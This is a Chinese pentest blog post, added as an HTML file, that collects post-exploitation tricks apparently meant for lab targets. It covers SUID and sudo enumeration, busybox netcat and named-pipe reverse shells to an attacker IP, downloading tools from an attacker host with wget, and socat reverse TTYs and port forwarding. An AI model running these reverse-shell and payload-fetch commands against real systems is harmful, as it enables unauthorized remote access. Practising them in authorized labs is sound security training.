@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - pentest tricks collection</title>
+        <meta name="description" content="the0n3">
+            <link rel="canonical" href="https://blog.the0n3.top">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+            <link rel="stylesheet" href="/assets/css/reading-progress.css">
+            <link rel="stylesheet" href="/assets/css/image-enhance.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+        <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+        <header>
+        <nav>
+            <div class="nav-right">
+                <a href="/">首页</a>
+                <a href="/archives">归档</a>
+                <a href="/categories">分类</a>
+                <a href="/tags">标签</a>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>pentest tricks collection</h1>
+    <p>
+        <span class="meta">发布于: 2025-11-12 20:49</span>
+    </p>
+    <div class="post-body">
+        <p>不断完善中....</p>
+<h2>检查变动</h2>
+<pre><code class="language-bash">dpkg -V</code></pre>
+<p>dpkg -V 检测的文件范围  </p>
+<p>所有通过apt/dpkg安装的软件包文件<br />
+二进制可执行文件 (/usr/bin/, /usr/sbin/)<br />
+系统库文件 (/usr/lib/, /lib/)<br />
+配置文件 (/etc/)<br />
+系统服务文件  </p>
+<h2>用户组</h2>
+<p>查看当前用户属组</p>
+<pre><code class="language-bash">id</code></pre>
+<pre><code class="language-bash">groups $USER</code></pre>
+<h2>sudo权限</h2>
+<blockquote>
+<p>基于/etc/sudoers 配置文件，允许被授权用户以另一个用户（通常是 root）的身份执行特定的命令。</p>
+</blockquote>
+<p>查看当前用户拥有哪些 sudo 权限。</p>
+<pre><code class="language-bash">sudo -l</code></pre>
+<h2>suid</h2>
+<p>查找系统中所有 suid 文件</p>
+<pre><code class="language-bash">find / -perm -4000 -type f 2&gt;/dev/null</code></pre>
+<h2>反弹shell</h2>
+<p>考虑busybox反弹shell的情况</p>
+<ul>
+<li>靶机没有nc、ncat等反弹shell工具</li>
+<li>阉割版nc，不具备反弹shell功能</li>
+<li>sh、bash反弹shell管道存在问题</li>
+<li>使用Alpine Linux做基础镜像的容器，工具较少</li>
+</ul>
+<pre><code class="language-bash">busybox nc 攻击机IP 端口 -e /bin/sh 
+# 创建命名管道
+busybox mkfifo /tmp/f
+/bin/sh -i 2&gt;&amp;1 &lt; /tmp/f | busybox nc 攻击者IP 端口 &gt; /tmp/f</code></pre>
+<p>busybox wget下载远程文件</p>
+<pre><code class="language-bash">busybox wget http://攻击机IP/文件 -O /本地路径/文件</code></pre>
+<p>反弹shell生成 <a href="https://the0n3.top/shell/">https://the0n3.top/shell/</a></p>
+<h2>稳定shell</h2>
+<p>行列数计算</p>
+<pre><code class="language-bash">stty -a|grep 'row'|awk -F'[ ;]+' '{print "stty "$4,$5,$6,$7}'</code></pre>
+<pre><code class="language-bash">script /dev/null -c bash
+# 按下 Ctrl+Z
+stty raw -echo; fg
+reset xterm
+export TERM=xterm
+export SHELL=/bin/bash
+# 此处使用上面计算行列数的结果
+stty rows 44 columns 208</code></pre>
+<p>或者使用 socat 获得一个完全交互式的TTY</p>
+<p>kali</p>
+<pre><code class="language-bash">socat file:`tty`,raw,echo=0 tcp-listen:4444</code></pre>
+<p>靶机</p>
+<pre><code class="language-bash">/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.6.101:4444</code></pre>
+<p>丢失用户名主机名环境变量可以重新设置</p>
+<pre><code class="language-bash">echo "export PS1='\[\e[1;31m\]\u\[\e[0m\]@\[\e[1;32m\]\h\[\e[0m\]:\[\e[1;34m\]\w\[\e[0m\]\\$ '" &gt;&gt; ~/.bashrc
+source ~/.bashrc</code></pre>
+<p>好看的提示符</p>
+<pre><code class="language-bash"># 彩色提示符
+export PS1='\[\e[1;31m\]\u\[\e[0m\]@\[\e[1;32m\]\h\[\e[0m\]:\[\e[1;34m\]\w\[\e[0m\]\$ '
+
+# 带时间戳的
+export PS1='\[\e[1;33m\][\t]\[\e[0m\] \u@\h:\w\$ '
+
+# 简单的
+export PS1='\u@\h:\w\$ '</code></pre>
+<h2>端口转发</h2>
+<p>常备socat</p>
+<pre><code class="language-bash">busybox wget http://192.168.56.100/socat -O ./socat
+chmod +x ./socat
+nohup ./socat TCP-LISTEN:8081,bind=0.0.0.0,fork TCP:127.0.0.1:8080 &amp;</code></pre>
+<h2>文件查找</h2>
+<p>查找最近7天变动文件的方法，打群友靶机可能有奇效（）</p>
+<pre><code class="language-bash">find / -perm -4000  2&gt;/dev/null
+
+# 查找最近7天变动的文件
+find / \
+  \( -path /run -o -path /sys -o -path /proc -o -path /var/lib -o -path /dev -o -path /usr -o -path /var/log -o -path /var/cache -o -path /boot/grub \) -prune -o \
+  \( -mtime -7 -o -ctime -7 \) -print 2&gt;/dev/null</code></pre>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>notes</span>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <span>#tricks</span>
+                            </span>
+            </div>
+    </article>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+        <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+        <script src="/assets/js/readingProgress.js"></script>
+            <script src="/assets/js/imageEnhance.js"></script>
+        <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+</body>
+</html>
